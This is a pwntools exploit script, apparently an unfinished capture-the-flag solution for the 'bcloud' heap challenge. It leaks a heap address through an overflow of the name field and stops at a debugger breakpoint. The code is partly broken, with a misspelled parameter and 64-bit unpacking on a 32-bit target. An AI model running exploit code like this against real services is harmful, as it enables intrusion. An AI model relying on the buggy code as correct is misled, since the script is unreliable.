from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='i386')
context.log_level='DEBUG'

p = process('./bcloud')
# p = remote('node3.buuoj.cn',26203)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def name(n):
	ru("Input your name:")
	sl(n)
	ru("Hey "+n)
	return ru("!")

def org_host(org,h):
	ru("Org:\n")
	sl(org)
	ru("Host:\n")
	sl(h)

def new(len,contnet):
	ru("option--->>")
	sl(1)
	ru("Input the length of the note content:")
	sl(len)
	ru("Input the content:")
	sl(content)

def edit(id,content):
	ru("option--->>")
	sl(3)
	ru("Input the id:")
	sl(id)
	ru("Input the new content:")
	sl(content)

def dlete(id):
	ru("option--->>")
	sl(4)
	ru("Input the id:")
	sl(id)

def dbg():
	gdb.attach(p)
	pause()


heap_base = u64(name('A'*64).ljust(8,'\x00')) - 0x8
# pwndbg> x/32w 0x81de000
# 0x81de000:	0x00000000	0x00000049	0x41414141	0x41414141
# 0x81de010:	0x41414141	0x41414141	0x41414141	0x41414141
# 0x81de020:	0x41414141	0x41414141	0x41414141	0x41414141
# 0x81de030:	0x41414141	0x41414141	0x41414141	0x41414141
# 0x81de040:	0x41414141	0x41414141	0x081de008	0x00020f00

leak('heap_base',heap_base)
dbg()
